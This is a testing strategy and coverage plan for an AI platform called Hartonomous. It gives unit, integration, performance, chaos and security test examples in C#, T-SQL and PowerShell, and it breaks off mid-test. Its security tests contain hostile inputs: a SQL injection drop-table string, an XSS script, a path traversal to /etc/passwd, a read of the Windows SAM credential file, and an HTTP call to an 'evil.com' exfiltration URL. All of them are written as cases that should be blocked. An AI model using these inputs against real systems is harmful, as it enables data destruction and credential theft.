# Testing Strategy and Coverage Plan

**Date:** November 12, 2025  
**System:** Comprehensive testing framework for autonomous AI substrate  
**Status:** **TESTING HAS BEEN COMPLETELY NEGLECTED** - This document provides the complete overhaul

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Test Pyramid Architecture](#test-pyramid-architecture)
3. [Unit Testing](#unit-testing)
4. [Integration Testing](#integration-testing)
5. [Performance Testing](#performance-testing)
6. [Chaos Engineering](#chaos-engineering)
7. [Compliance & Security Testing](#compliance--security-testing)
8. [Student Model Quality Validation](#student-model-quality-validation)
9. [A/B Testing Framework](#ab-testing-framework)
10. [Coverage Goals & Metrics](#coverage-goals--metrics)
11. [Implementation Roadmap](#implementation-roadmap)

---

## Executive Summary

### Current State: Zero Test Coverage

**Reality Check:**
Testing has been **completely neglected**. There is:
- ❌ No unit tests
- ❌ No integration tests
- ❌ No performance benchmarks
- ❌ No chaos testing
- ❌ No security penetration tests
- ❌ No student model validation
- ❌ No A/B testing framework

**This is unacceptable for a production system.**

### Testing Philosophy

**Core Principle:**
An autonomous AI system that improves itself MUST have comprehensive automated testing. Without tests:
- OODA loop could regress performance
- Student models could degrade quality
- Security vulnerabilities could go undetected
- Billing enforcement could fail silently
- Data corruption could cascade

**Test-Driven Development (TDD) Going Forward:**
1. Write test first (red)
2. Implement feature (green)
3. Refactor (maintain green)

**Continuous Testing:**
- Every commit triggers tests
- Every OODA cycle validated
- Every student model measured
- Every deployment smoke-tested

### Coverage Goals

**Target Coverage (6 months):**

| Layer | Current | Target | Critical Path Target |
|-------|---------|--------|---------------------|
| Unit Tests | 0% | 80% | 95% |
| Integration Tests | 0% | 70% | 90% |
| Performance Tests | 0% | 100% (all endpoints) | 100% |
| Chaos Tests | 0% | 50% (critical scenarios) | 80% |
| Security Tests | 0% | 60% | 90% |
| Compliance Tests | 0% | 100% (GDPR, billing) | 100% |
| Student Model Validation | 0% | 100% (all students) | 100% |

**Critical Paths (Must reach 95% coverage):**
- Billing enforcement (pre-execution quota checks)
- UNSAFE CLR functions (vector ops, embeddings)
- OODA loop (hypothesis generation, action execution)
- Student model distillation (layer extraction, quality validation)
- Neo4j sync (SQL → Service Broker → Neo4j)
- FILESTREAM operations (tensor storage, cross-server access)

---

## Test Pyramid Architecture

### The Testing Pyramid

```
        /\
       /  \
      / UI \           10% - End-to-End (E2E) Tests
     /------\
    /        \
   / Service  \        20% - Service/API Integration Tests
  /------------\
 /              \
/ Integration    \     30% - Cross-Component Integration Tests
/------------------\
/                    \
/    Unit Tests       \  40% - Fast, Isolated Unit Tests
/----------------------\
```

**Distribution:**
- **40% Unit Tests:** Fast, isolated, test individual functions/methods
- **30% Integration Tests:** Test interactions between components (DB ↔ API, SQL ↔ CLR)
- **20% Service Tests:** Test API endpoints end-to-end (HTTP → DB → Response)
- **10% E2E Tests:** Test complete user flows (browser automation)

**Rationale:**
- Unit tests run fastest (milliseconds), provide immediate feedback
- Integration tests catch interface mismatches
- Service tests validate real-world API behavior
- E2E tests are slow but catch UI bugs

### Test Layers

**Layer 1: Unit Tests**
- Test individual C# methods, SQL functions, CLR functions
- Mock all external dependencies
- Run in-memory (no database calls)
- Target: <100ms per test

**Layer 2: Integration Tests**
- Test SQL ↔ EF Core mappings
- Test CLR ↔ SQL Server interactions
- Test Service Broker message flows
- Test Neo4j ↔ SQL Server sync
- Target: <1s per test

**Layer 3: Service Tests**
- Test API endpoints (Hartonomous.Api)
- Test background workers (Hartonomous.CesConsumer, Neo4jSync)
- Test OODA loop complete cycles
- Target: <5s per test

**Layer 4: Performance Tests**
- Benchmark API latency (p50, p95, p99)
- Load test concurrent users
- Stress test queue throughput
- Target: Continuous monitoring

**Layer 5: Chaos Tests**
- Simulate network partitions
- Kill processes mid-transaction
- Corrupt FILESTREAM data
- Inject SQL errors
- Target: Quarterly execution

---

## Unit Testing

### C# Unit Tests (xUnit)

**Project Structure:**

```
Hartonomous.Tests/
├── Hartonomous.Core.Tests/
│   ├── Services/
│   │   ├── DistillationServiceTests.cs
│   │   ├── EmbeddingServiceTests.cs
│   │   └── BillingEnforcementServiceTests.cs
│   ├── Utilities/
│   │   ├── VectorMathTests.cs
│   │   └── JsonUtilsTests.cs
│   └── Models/
│       ├── AtomTests.cs
│       └── StudentModelTests.cs
├── Hartonomous.Api.Tests/
│   ├── Controllers/
│   │   ├── ConversationControllerTests.cs
│   │   ├── AutonomyControllerTests.cs
│   │   └── BillingControllerTests.cs
│   └── Middleware/
│       ├── AuthenticationMiddlewareTests.cs
│       └── RateLimitMiddlewareTests.cs
└── Hartonomous.ClrFunctions.Tests/
    ├── VectorOperationsTests.cs
    ├── EmbeddingGenerationTests.cs
    └── ModelInferenceTests.cs
```

**Example: BillingEnforcementServiceTests.cs**

```csharp
using Xunit;
using Moq;
using Hartonomous.Core.Services;
using Hartonomous.Core.Models;

namespace Hartonomous.Core.Tests.Services
{
    public class BillingEnforcementServiceTests
    {
        private readonly Mock<IDbContext> _mockDbContext;
        private readonly BillingEnforcementService _service;
        
        public BillingEnforcementServiceTests()
        {
            _mockDbContext = new Mock<IDbContext>();
            _service = new BillingEnforcementService(_mockDbContext.Object);
        }
        
        [Fact]
        public async Task CheckQuotaAsync_UserWithinQuota_ReturnsTrue()
        {
            // Arrange
            var userId = Guid.NewGuid();
            var requestTokens = 1000;
            
            _mockDbContext.Setup(db => db.TenantUsageTracking
                .Where(t => t.UserId == userId && t.PeriodStartUtc <= DateTime.UtcNow)
                .FirstOrDefaultAsync())
                .ReturnsAsync(new TenantUsageTracking 
                { 
                    UserId = userId, 
                    TokensConsumed = 5000, 
                    MonthlyQuota = 10000 
                });
            
            // Act
            var result = await _service.CheckQuotaAsync(userId, requestTokens);
            
            // Assert
            Assert.True(result);
        }
        
        [Fact]
        public async Task CheckQuotaAsync_UserExceedsQuota_ReturnsFalse()
        {
            // Arrange
            var userId = Guid.NewGuid();
            var requestTokens = 6000;
            
            _mockDbContext.Setup(db => db.TenantUsageTracking
                .Where(t => t.UserId == userId && t.PeriodStartUtc <= DateTime.UtcNow)
                .FirstOrDefaultAsync())
                .ReturnsAsync(new TenantUsageTracking 
                { 
                    UserId = userId, 
                    TokensConsumed = 5000, 
                    MonthlyQuota = 10000 
                });
            
            // Act
            var result = await _service.CheckQuotaAsync(userId, requestTokens);
            
            // Assert
            Assert.False(result);
        }
        
        [Fact]
        public async Task DeductTokensAsync_ValidRequest_UpdatesDatabase()
        {
            // Arrange
            var userId = Guid.NewGuid();
            var tokensUsed = 1500;
            var usage = new TenantUsageTracking { UserId = userId, TokensConsumed = 5000 };
            
            _mockDbContext.Setup(db => db.TenantUsageTracking.FindAsync(userId))
                .ReturnsAsync(usage);
            
            // Act
            await _service.DeductTokensAsync(userId, tokensUsed);
            
            // Assert
            Assert.Equal(6500, usage.TokensConsumed);
            _mockDbContext.Verify(db => db.SaveChangesAsync(default), Times.Once);
        }
    }
}
```

### SQL Unit Tests (tSQLt Framework)

**Installation:**

```sql
-- Install tSQLt from https://tsqlt.org/
EXEC tSQLt.NewTestClass 'BillingTests';
EXEC tSQLt.NewTestClass 'OODALoopTests';
EXEC tSQLt.NewTestClass 'DistillationTests';
```

**Example: Test Billing Enforcement**

```sql
CREATE PROCEDURE BillingTests.[test sp_EnforceBillingQuota blocks over-quota users]
AS
BEGIN
    -- Arrange
    EXEC tSQLt.FakeTable 'TenantUsageTracking';
    EXEC tSQLt.FakeTable 'TenantQuotaPolicies';
    
    INSERT INTO TenantUsageTracking (UserId, TokensConsumed, MonthlyQuota)
    VALUES ('F7B4C8D2-1234-5678-90AB-CDEF01234567', 9500, 10000);
    
    -- Act
    DECLARE @IsAllowed BIT;
    EXEC dbo.sp_EnforceBillingQuota 
        @UserId = 'F7B4C8D2-1234-5678-90AB-CDEF01234567',
        @RequestedTokens = 1000,
        @IsAllowed = @IsAllowed OUTPUT;
    
    -- Assert
    EXEC tSQLt.AssertEquals 0, @IsAllowed;  -- Should be blocked
END;
GO

CREATE PROCEDURE BillingTests.[test sp_EnforceBillingQuota allows within-quota users]
AS
BEGIN
    -- Arrange
    EXEC tSQLt.FakeTable 'TenantUsageTracking';
    
    INSERT INTO TenantUsageTracking (UserId, TokensConsumed, MonthlyQuota)
    VALUES ('F7B4C8D2-1234-5678-90AB-CDEF01234567', 5000, 10000);
    
    -- Act
    DECLARE @IsAllowed BIT;
    EXEC dbo.sp_EnforceBillingQuota 
        @UserId = 'F7B4C8D2-1234-5678-90AB-CDEF01234567',
        @RequestedTokens = 1000,
        @IsAllowed = @IsAllowed OUTPUT;
    
    -- Assert
    EXEC tSQLt.AssertEquals 1, @IsAllowed;  -- Should be allowed
END;
GO

-- Run all billing tests
EXEC tSQLt.Run 'BillingTests';
```

**Example: Test OODA Loop Hypothesis Generation**

```sql
CREATE PROCEDURE OODALoopTests.[test sp_Hypothesize generates IndexOptimization for missing indexes]
AS
BEGIN
    -- Arrange
    EXEC tSQLt.FakeTable 'AutonomousObservations';
    EXEC tSQLt.FakeTable 'AutonomousHypotheses';
    
    DECLARE @AnalysisId UNIQUEIDENTIFIER = NEWID();
    
    INSERT INTO AutonomousObservations (AnalysisId, ObservationType, MetricName, MetricValue)
    VALUES (@AnalysisId, 'MissingIndex', 'Atoms_CreatedAtUtc', 85.0);  -- 85% impact
    
    -- Act
    DECLARE @ObservationsJson NVARCHAR(MAX) = (
        SELECT @AnalysisId AS analysisId,
        (SELECT * FROM AutonomousObservations WHERE AnalysisId = @AnalysisId FOR JSON PATH) AS observations
        FOR JSON PATH, WITHOUT_ARRAY_WRAPPER
    );
    
    EXEC dbo.sp_Hypothesize @ObservationsJson;
    
    -- Assert
    DECLARE @HypothesisCount INT = (SELECT COUNT(*) FROM AutonomousHypotheses WHERE AnalysisId = @AnalysisId);
    EXEC tSQLt.AssertEquals 1, @HypothesisCount;
    
    DECLARE @HypothesisType NVARCHAR(50) = (SELECT HypothesisType FROM AutonomousHypotheses WHERE AnalysisId = @AnalysisId);
    EXEC tSQLt.AssertEqualsString 'IndexOptimization', @HypothesisType;
    
    DECLARE @Priority INT = (SELECT Priority FROM AutonomousHypotheses WHERE AnalysisId = @AnalysisId);
    EXEC tSQLt.AssertEquals 5, @Priority;  -- Very high priority for 85% impact
END;
GO
```

### CLR Function Unit Tests

**Project: Hartonomous.ClrFunctions.Tests**

```csharp
using Xunit;
using System.Data.SqlTypes;
using Hartonomous.ClrFunctions;

namespace Hartonomous.ClrFunctions.Tests
{
    public class VectorOperationsTests
    {
        [Fact]
        public void CosineSimilarity_IdenticalVectors_Returns1()
        {
            // Arrange
            var vector1 = new SqlBinary(new byte[] { 0, 0, 128, 63, 0, 0, 128, 63 }); // [1.0, 1.0]
            var vector2 = new SqlBinary(new byte[] { 0, 0, 128, 63, 0, 0, 128, 63 }); // [1.0, 1.0]
            
            // Act
            var result = VectorOperations.CosineSimilarity(vector1, vector2);
            
            // Assert
            Assert.Equal(1.0, result.Value, precision: 5);
        }
        
        [Fact]
        public void CosineSimilarity_OrthogonalVectors_Returns0()
        {
            // Arrange
            var vector1 = new SqlBinary(new byte[] { 0, 0, 128, 63, 0, 0, 0, 0 }); // [1.0, 0.0]
            var vector2 = new SqlBinary(new byte[] { 0, 0, 0, 0, 0, 0, 128, 63 }); // [0.0, 1.0]
            
            // Act
            var result = VectorOperations.CosineSimilarity(vector1, vector2);
            
            // Assert
            Assert.Equal(0.0, result.Value, precision: 5);
        }
        
        [Fact]
        public void VectorDot_SimpleVectors_ReturnsCorrectProduct()
        {
            // Arrange
            var vector1 = new SqlBinary(new byte[] { /* [2.0, 3.0] */ });
            var vector2 = new SqlBinary(new byte[] { /* [4.0, 5.0] */ });
            
            // Act
            var result = VectorOperations.VectorDot(vector1, vector2);
            
            // Assert
            Assert.Equal(23.0, result.Value, precision: 5); // 2*4 + 3*5 = 23
        }
    }
}
```

---

## Integration Testing

### Database Integration Tests

**Test EF Core Mappings:**

```csharp
using Xunit;
using Microsoft.EntityFrameworkCore;
using Hartonomous.Infrastructure.Data;

namespace Hartonomous.Infrastructure.Tests
{
    public class AtomRepositoryIntegrationTests : IClassFixture<DatabaseFixture>
    {
        private readonly DatabaseFixture _fixture;
        
        public AtomRepositoryIntegrationTests(DatabaseFixture fixture)
        {
            _fixture = fixture;
        }
        
        [Fact]
        public async Task CreateAtom_ValidData_SavesToDatabase()
        {
            // Arrange
            using var context = _fixture.CreateContext();
            var atom = new Atom
            {
                AtomId = Guid.NewGuid(),
                Modality = "text",
                SourceUri = "test://example",
                ContentHash = "abc123",
                CreatedAtUtc = DateTime.UtcNow
            };
            
            // Act
            context.Atoms.Add(atom);
            await context.SaveChangesAsync();
            
            // Assert
            var saved = await context.Atoms.FindAsync(atom.AtomId);
            Assert.NotNull(saved);
            Assert.Equal("text", saved.Modality);
        }
        
        [Fact]
        public async Task GetAtomsWithEmbeddings_JoinQuery_ReturnsCorrectData()
        {
            // Arrange
            using var context = _fixture.CreateContext();
            
            var atomId = Guid.NewGuid();
            context.Atoms.Add(new Atom { AtomId = atomId, Modality = "text" });
            context.AtomEmbeddings.Add(new AtomEmbedding 
            { 
                AtomId = atomId, 
                EmbeddingVector = new byte[512] 
            });
            await context.SaveChangesAsync();
            
            // Act
            var result = await context.Atoms
                .Where(a => a.AtomId == atomId)
                .Include(a => a.Embeddings)
                .FirstOrDefaultAsync();
            
            // Assert
            Assert.NotNull(result);
            Assert.Single(result.Embeddings);
            Assert.Equal(512, result.Embeddings.First().EmbeddingVector.Length);
        }
    }
    
    public class DatabaseFixture : IDisposable
    {
        private readonly string _connectionString;
        
        public DatabaseFixture()
        {
            // Use local SQL Server test database
            _connectionString = "Server=localhost;Database=HartonomousTest;Integrated Security=true;";
            
            // Run migrations
            using var context = CreateContext();
            context.Database.Migrate();
        }
        
        public HartonomousDbContext CreateContext()
        {
            var options = new DbContextOptionsBuilder<HartonomousDbContext>()
                .UseSqlServer(_connectionString)
                .Options;
            
            return new HartonomousDbContext(options);
        }
        
        public void Dispose()
        {
            // Drop test database
            using var context = CreateContext();
            context.Database.EnsureDeleted();
        }
    }
}
```

### Service Broker Integration Tests

**Test OODA Loop Message Flow:**

```sql
-- Test message routing
CREATE PROCEDURE OODALoopTests.[test Service Broker routes AnalyzeMessage to HypothesizeQueue]
AS
BEGIN
    -- Arrange
    DECLARE @ConversationHandle UNIQUEIDENTIFIER;
    
    BEGIN CONVERSATION @ConversationHandle
        FROM SERVICE AnalyzeService
        TO SERVICE 'HypothesizeService'
        ON CONTRACT [//Hartonomous/AutonomousLoop/AnalyzeContract]
        WITH ENCRYPTION = OFF;
    
    DECLARE @AnalysisId UNIQUEIDENTIFIER = NEWID();
    DECLARE @MessageBody NVARCHAR(MAX) = JSON_QUERY('{"analysisId":"' + CAST(@AnalysisId AS NVARCHAR(36)) + '"}');
    
    -- Act
    SEND ON CONVERSATION @ConversationHandle
        MESSAGE TYPE [//Hartonomous/AutonomousLoop/AnalyzeMessage]
        (@MessageBody);
    
    -- Wait for processing
    WAITFOR DELAY '00:00:02';
    
    -- Assert
    DECLARE @MessageCount INT = (SELECT COUNT(*) FROM HypothesizeQueue);
    EXEC tSQLt.AssertEquals 1, @MessageCount;
    
    -- Cleanup
    END CONVERSATION @ConversationHandle WITH CLEANUP;
END;
GO
```

### Neo4j Sync Integration Tests

**Test SQL → Neo4j Data Flow:**

```csharp
using Xunit;
using Neo4j.Driver;
using System.Data.SqlClient;

namespace Hartonomous.Neo4jSync.Tests
{
    public class Neo4jSyncIntegrationTests : IAsyncLifetime
    {
        private IDriver _neo4jDriver;
        private SqlConnection _sqlConnection;
        
        public async Task InitializeAsync()
        {
            _neo4jDriver = GraphDatabase.Driver("bolt://localhost:7687", 
                AuthTokens.Basic("neo4j", "password"));
            _sqlConnection = new SqlConnection("Server=localhost;Database=HartonomousTest;");
            await _sqlConnection.OpenAsync();
        }
        
        [Fact]
        public async Task InsertAtom_TriggersNeo4jSync_CreatesNode()
        {
            // Arrange
            var atomId = Guid.NewGuid();
            
            // Act - Insert atom in SQL Server
            var command = new SqlCommand(
                "INSERT INTO Atoms (AtomId, Modality, SourceUri, ContentHash) " +
                "VALUES (@atomId, 'text', 'test://sync', 'hash123')", 
                _sqlConnection);
            command.Parameters.AddWithValue("@atomId", atomId);
            await command.ExecuteNonQueryAsync();
            
            // Wait for Service Broker + Neo4jSync worker
            await Task.Delay(3000);
            
            // Assert - Check Neo4j has node
            var session = _neo4jDriver.AsyncSession();
            try
            {
                var result = await session.ExecuteReadAsync(async tx =>
                {
                    var cursor = await tx.RunAsync(
                        "MATCH (a:Atom {atomId: $atomId}) RETURN a",
                        new { atomId = atomId.ToString() });
                    return await cursor.SingleAsync();
                });
                
                Assert.NotNull(result);
                Assert.Equal("text", result["a"].As<INode>()["modality"].As<string>());
            }
            finally
            {
                await session.CloseAsync();
            }
        }
        
        public async Task DisposeAsync()
        {
            await _neo4jDriver.CloseAsync();
            await _sqlConnection.DisposeAsync();
        }
    }
}
```

### Linked Server Integration Tests

**Test Cross-Server Queries:**

```sql
-- Test Windows → Ubuntu linked server query
CREATE PROCEDURE LinkedServerTests.[test SELECT from hart-server executes successfully]
AS
BEGIN
    -- Arrange (assume linked server configured)
    DECLARE @RemoteQuery NVARCHAR(MAX) = 'SELECT TOP 1 AtomId FROM Atoms';
    
    -- Act
    DECLARE @AtomId UNIQUEIDENTIFIER;
    
    BEGIN TRY
        EXEC ('SELECT @AtomId = AtomId FROM OPENQUERY([hart-server], ''' + @RemoteQuery + ''')') AT [hart-server];
        
        -- Assert - Query executed without error
        EXEC tSQLt.AssertNotEquals @AtomId, NULL;
    END TRY
    BEGIN CATCH
        EXEC tSQLt.Fail 'Linked server query failed';
    END CATCH;
END;
GO

-- Test latency benchmark
CREATE PROCEDURE LinkedServerTests.[test Linked server latency under 100ms]
AS
BEGIN
    DECLARE @Start DATETIME2 = SYSUTCDATETIME();
    
    -- Execute simple query
    EXEC ('SELECT 1') AT [hart-server];
    
    DECLARE @LatencyMs INT = DATEDIFF(MILLISECOND, @Start, SYSUTCDATETIME());
    
    -- Assert latency acceptable
    IF @LatencyMs > 100
        EXEC tSQLt.Fail 'Linked server latency too high';
END;
GO
```

---

## Performance Testing

### API Endpoint Benchmarks

**Tool: NBomber (C# Load Testing)**

```csharp
using NBomber;
using NBomber.Contracts;
using NBomber.CSharp;
using NBomber.Http.CSharp;

namespace Hartonomous.PerformanceTests
{
    public class ConversationEndpointLoadTest
    {
        [Fact]
        public void ConversationEndpoint_100ConcurrentUsers_MeetsLatencySLA()
        {
            // Arrange
            var httpClient = new HttpClient();
            httpClient.BaseAddress = new Uri("http://localhost:5000");
            httpClient.DefaultRequestHeaders.Add("Authorization", "Bearer test-token");
            
            var scenario = Scenario.Create("conversation_load_test", async context =>
            {
                var request = Http.CreateRequest("POST", "/api/conversations")
                    .WithHeader("Content-Type", "application/json")
                    .WithBody(new StringContent(@"{
                        ""messages"": [{""role"":""user"",""content"":""Hello""}],
                        ""model"": ""gpt-4""
                    }"));
                
                var response = await Http.Send(httpClient, request);
                
                return response;
            })
            .WithWarmUpDuration(TimeSpan.FromSeconds(5))
            .WithLoadSimulations(
                Simulation.Inject(rate: 100, interval: TimeSpan.FromSeconds(1), during: TimeSpan.FromMinutes(5))
            );
            
            // Act
            var stats = NBomberRunner
                .RegisterScenarios(scenario)
                .Run();
            
            // Assert
            var conversationStats = stats.ScenarioStats[0];
            
            Assert.True(conversationStats.Ok.Request.RPS > 50, "RPS should be > 50");
            Assert.True(conversationStats.Ok.Latency.Percent95 < 2000, "P95 latency should be < 2s");
            Assert.True(conversationStats.Ok.Latency.Percent99 < 5000, "P99 latency should be < 5s");
            Assert.True(conversationStats.Fail.Request.Count == 0, "No failed requests");
        }
    }
}
```

### SQL Query Performance Tests

**Benchmark Critical Queries:**

```sql
-- Create performance baseline
CREATE TABLE QueryPerformanceBaselines (
    QueryName NVARCHAR(128) PRIMARY KEY,
    AvgExecutionTimeMs INT NOT NULL,
    MaxExecutionTimeMs INT NOT NULL,
    MeasuredAtUtc DATETIME2 DEFAULT SYSUTCDATETIME()
);

-- Benchmark vector search query
CREATE PROCEDURE PerformanceTests.[test VectorSearch query under 500ms for 1M atoms]
AS
BEGIN
    -- Arrange
    DECLARE @QueryVector VARBINARY(MAX) = (SELECT TOP 1 EmbeddingVector FROM AtomEmbeddings);
    DECLARE @Start DATETIME2 = SYSUTCDATETIME();
    
    -- Act
    SELECT TOP 10 
        a.AtomId,
        dbo.fn_CosineSimilarity(ae.EmbeddingVector, @QueryVector) AS Similarity
    FROM Atoms a
    JOIN AtomEmbeddings ae ON a.AtomId = ae.AtomId
    ORDER BY dbo.fn_CosineSimilarity(ae.EmbeddingVector, @QueryVector) DESC;
    
    DECLARE @ExecutionTimeMs INT = DATEDIFF(MILLISECOND, @Start, SYSUTCDATETIME());
    
    -- Assert
    IF @ExecutionTimeMs > 500
        EXEC tSQLt.Fail 'Vector search too slow';
    
    -- Record baseline
    MERGE QueryPerformanceBaselines AS target
    USING (SELECT 'VectorSearch_Top10' AS QueryName, @ExecutionTimeMs AS AvgExecutionTimeMs) AS source
    ON target.QueryName = source.QueryName
    WHEN MATCHED AND @ExecutionTimeMs > target.MaxExecutionTimeMs THEN
        UPDATE SET MaxExecutionTimeMs = @ExecutionTimeMs
    WHEN NOT MATCHED THEN
        INSERT (QueryName, AvgExecutionTimeMs, MaxExecutionTimeMs)
        VALUES (source.QueryName, source.AvgExecutionTimeMs, source.AvgExecutionTimeMs);
END;
GO
```

### FILESTREAM Throughput Tests

**Benchmark Tensor I/O:**

```sql
CREATE PROCEDURE PerformanceTests.[test FILESTREAM write 100MB tensor under 2 seconds]
AS
BEGIN
    -- Arrange
    DECLARE @TensorData VARBINARY(MAX) = REPLICATE(CAST(0x01 AS VARBINARY(MAX)), 104857600); -- 100MB
    DECLARE @PayloadId UNIQUEIDENTIFIER = NEWID();
    DECLARE @Start DATETIME2 = SYSUTCDATETIME();
    
    -- Act
    INSERT INTO TensorAtomPayloads (PayloadId, PayloadData)
    VALUES (@PayloadId, @TensorData);
    
    DECLARE @WriteTimeMs INT = DATEDIFF(MILLISECOND, @Start, SYSUTCDATETIME());
    
    -- Assert
    IF @WriteTimeMs > 2000
        EXEC tSQLt.Fail 'FILESTREAM write too slow';
        
    -- Cleanup
    DELETE FROM TensorAtomPayloads WHERE PayloadId = @PayloadId;
END;
GO
```

---

## Chaos Engineering

### Network Partition Simulation

**Test Linked Server Failure:**

```powershell
# Block network traffic to Ubuntu server
New-NetFirewallRule -DisplayName "Block hart-server" `
    -Direction Outbound `
    -RemoteAddress 192.168.1.100 `
    -Action Block

# Wait for timeout
Start-Sleep -Seconds 30

# Verify API handles gracefully
$response = Invoke-RestMethod -Uri "http://localhost:5000/api/conversations" `
    -Method POST `
    -Body '{"messages":[{"role":"user","content":"Test"}]}'

# Should return cached result or error, not hang
if ($response.error -and $response.error -eq "LinkedServerUnavailable") {
    Write-Host "PASS: Graceful degradation"
} else {
    Write-Host "FAIL: Did not handle network partition"
}

# Restore network
Remove-NetFirewallRule -DisplayName "Block hart-server"
```

### Process Kill Tests

**Test Service Broker Recovery:**

```sql
-- Start OODA loop
EXEC dbo.sp_TriggerOODALoop @AnalysisScope = 'performance';

-- Kill SQL Server (simulate crash)
-- Manually stop SQL Server service

-- Restart SQL Server
-- Service Broker should auto-resume conversations

-- Verify no data loss
SELECT 
    COUNT(*) AS InFlightMessages
FROM sys.transmission_queue;

-- All messages should eventually process (may take a few minutes)
```

### FILESTREAM Corruption Tests

**Test Corruption Detection:**

```sql
CREATE PROCEDURE ChaosTests.[test FILESTREAM corruption detected and logged]
AS
BEGIN
    -- Arrange
    DECLARE @PayloadId UNIQUEIDENTIFIER = NEWID();
    INSERT INTO TensorAtomPayloads (PayloadId, PayloadData)
    VALUES (@PayloadId, REPLICATE(CAST(0x01 AS VARBINARY(MAX)), 1024));
    
    -- Act - Manually corrupt FILESTREAM file (requires file system access)
    -- (In real test, use PowerShell to modify C:\SQLFilestream\Hartonomous\* file)
    
    -- Try to read corrupted payload
    DECLARE @ReadData VARBINARY(MAX);
    
    BEGIN TRY
        SELECT @ReadData = PayloadData FROM TensorAtomPayloads WHERE PayloadId = @PayloadId;
        EXEC tSQLt.Fail 'Should have detected corruption';
    END TRY
    BEGIN CATCH
        -- Assert - Error logged
        IF ERROR_NUMBER() = 5180  -- FILESTREAM corruption error
        BEGIN
            EXEC tSQLt.Pass;
        END
        ELSE
        BEGIN
            EXEC tSQLt.Fail 'Wrong error type';
        END
    END CATCH;
END;
GO
```

### SQL Injection Chaos

**Test Input Sanitization:**

```csharp
[Theory]
[InlineData("'; DROP TABLE Atoms; --")]
[InlineData("<script>alert('xss')</script>")]
[InlineData("../../etc/passwd")]
public async Task ConversationEndpoint_MaliciousInput_DoesNotExecute(string maliciousInput)
{
    // Arrange
    var client = _factory.CreateClient();
    var request = new ConversationRequest
    {
        Messages = new[] { new Message { Role = "user", Content = maliciousInput } }
    };
    
    // Act
    var response = await client.PostAsJsonAsync("/api/conversations", request);
    
    // Assert
    Assert.True(response.IsSuccessStatusCode || response.StatusCode == System.Net.HttpStatusCode.BadRequest);
    
    // Verify Atoms table still exists
    using var connection = new SqlConnection(_connectionString);
    var command = new SqlCommand("SELECT COUNT(*) FROM Atoms", connection);
    await connection.OpenAsync();
    var count = (int)await command.ExecuteScalarAsync();
    
    Assert.True(count >= 0); // Table exists and queryable
}
```

---

## Compliance & Security Testing

### GDPR Right to Explanation Tests

**Test Neo4j Explainability Queries:**

```csharp
using Xunit;
using Neo4j.Driver;

namespace Hartonomous.Compliance.Tests
{
    public class GDPRComplianceTests
    {
        [Fact]
        public async Task ExplainDecision_ValidRequest_ReturnsCompleteProvenance()
        {
            // Arrange
            var driver = GraphDatabase.Driver("bolt://localhost:7687");
            var session = driver.AsyncSession();
            var decisionId = Guid.NewGuid();
            
            // Act
            var result = await session.ExecuteReadAsync(async tx =>
            {
                var cursor = await tx.RunAsync(@"
                    MATCH path = (d:Decision {decisionId: $decisionId})-[:INFLUENCED_BY*]->(source)
                    RETURN path, 
                           nodes(path) AS factors,
                           [n in nodes(path) | n.weight] AS weights
                ", new { decisionId = decisionId.ToString() });
                
                return await cursor.ToListAsync();
            });
            
            // Assert
            Assert.NotEmpty(result);
            
            var factors = result[0]["factors"].As<IList<INode>>();
            Assert.True(factors.Count > 0, "Must return influencing factors");
            
            var weights = result[0]["weights"].As<IList<double>>();
            Assert.All(weights, w => Assert.InRange(w, 0.0, 1.0));
        }
    }
}
```

### Billing Enforcement Security Tests

**Test Quota Bypass Attempts:**

```csharp
[Fact]
public async Task ConversationEndpoint_ExceedsQuota_Returns429()
{
    // Arrange
    var userId = Guid.NewGuid();
    
    // Set quota to 1000 tokens
    await SetUserQuotaAsync(userId, monthlyQuota: 1000);
    
    // Consume 950 tokens
    await ConsumeTokensAsync(userId, 950);
    
    // Act - Try to use 100 tokens (would exceed quota)
    var client = CreateAuthenticatedClient(userId);
    var response = await client.PostAsJsonAsync("/api/conversations", new ConversationRequest
    {
        Messages = new[] { new Message { Role = "user", Content = "Test message requiring 100 tokens" } }
    });
    
    // Assert
    Assert.Equal(System.Net.HttpStatusCode.TooManyRequests, response.StatusCode);
    
    var body = await response.Content.ReadAsStringAsync();
    Assert.Contains("quota exceeded", body.ToLower());
}

[Fact]
public async Task ConversationEndpoint_RapidRequests_RateLimited()
{
    // Arrange
    var client = CreateAuthenticatedClient();
    var tasks = new List<Task<HttpResponseMessage>>();
    
    // Act - Send 100 requests simultaneously
    for (int i = 0; i < 100; i++)
    {
        tasks.Add(client.PostAsJsonAsync("/api/conversations", new ConversationRequest
        {
            Messages = new[] { new Message { Role = "user", Content = $"Request {i}" } }
        }));
    }
    
    var responses = await Task.WhenAll(tasks);
    
    // Assert - Some requests should be rate-limited
    var rateLimited = responses.Count(r => r.StatusCode == System.Net.HttpStatusCode.TooManyRequests);
    Assert.True(rateLimited > 0, "Rate limiting should trigger");
}
```

### CLR Security Tests

**Test UNSAFE CLR Sandboxing:**

```csharp
[Fact]
public void CLRFunction_FileSystemAccess_Denied()
{
    // Arrange
    var connection = new SqlConnection(_connectionString);
    connection.Open();
    
    // Act - Try to call CLR function that accesses file system
    var command = new SqlCommand("SELECT dbo.fn_ReadFile('C:\\Windows\\System32\\config\\SAM')", connection);
    
    // Assert - Should throw security exception
    var exception = Assert.Throws<SqlException>(() => command.ExecuteScalar());
    Assert.Contains("permission", exception.Message.ToLower());
}

[Fact]
public void CLRFunction_NetworkAccess_Denied()
{
    // Arrange
    var connection = new SqlConnection(_connectionString);
    connection.Open();
    
    // Act - Try to call CLR function that makes HTTP request
    var command = new SqlCommand("SELECT dbo.fn_HttpGet('http://evil.com/steal-data')", connection);
    
    // Assert - Should throw security exception
    var exception = Assert.Throws<SqlException>(() => command.ExecuteScalar());
    Assert.Contains("permission", exception.Message.ToLower());
}
```

---

## Student Model Quality Validation

### Accuracy Regression Tests

**Test Student vs Parent Accuracy:**

```csharp
using Xunit;
using Hartonomous.Core.Services;

namespace Hartonomous.ModelValidation.Tests
{
    public class StudentModelQualityTests
    {
        [Theory]
        [InlineData("MultilingualTranslation_Student", "gpt-4", 0.95)] // Must be ≥95% of parent
        [InlineData("CodeGeneration_Student", "claude-3.5-sonnet", 0.90)]
        [InlineData("SentimentAnalysis_Student", "gpt-3.5-turbo", 0.98)]
        public async Task StudentModel_Accuracy_MeetsQualityThreshold(
            string studentModelName, 
            string parentModelName, 
            double qualityThreshold)
        {
            // Arrange
            var testDataset = await LoadTestDatasetAsync(parentModelName);
            var studentService = new ModelInferenceService(studentModelName);
            var parentService = new ModelInferenceService(parentModelName);
            
